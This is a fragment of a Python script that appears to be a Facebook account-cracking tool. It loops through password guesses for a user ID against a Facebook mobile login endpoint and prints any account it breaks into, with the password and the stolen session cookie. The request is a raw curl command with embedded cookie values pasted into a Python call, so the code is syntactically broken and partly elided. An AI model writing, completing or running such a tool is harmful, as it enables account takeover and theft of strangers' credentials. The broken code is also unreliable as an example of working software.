...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
           ...
           'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('curl 'https://p.facebook.com/?stype=lo&jlou=rdr_05nqR5CLiWuP4k2GM&_rdr' \
  -H 'authority: p.facebook.com' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'cache-control: max-age=0' \
  -H 'cookie: datr=8rDhZP-L6C-jWJmmZM--Kjvw; sb=8rDhZIRL93L_RdIFqidr0rRk; locale=en_GB; vpd=v1%3B768x393x2.75; m_pixel_ratio=2.75; wl_cbv=v2%3Bclient_version%3A2310%3Btimestamp%3A1692726360; wd=393x768; fr=0jmotpgyl6hnbt7Sa.AWWwaRzfLVMlrpo-8z183WD8Xuc.Bk4bDy.S4.AAA.0.0.Bk5PXL.AWUhEG9U3JU' \
  -H 'dpr: 2.75' \
  -H 'sec-ch-prefers-color-scheme: dark' \
  -H 'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"' \
  -H 'sec-ch-ua-full-version-list: "Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"' \
  ...
  --compressed
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[ZALIM-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                print("\x1b[38;5;208m---------------------------------------------")
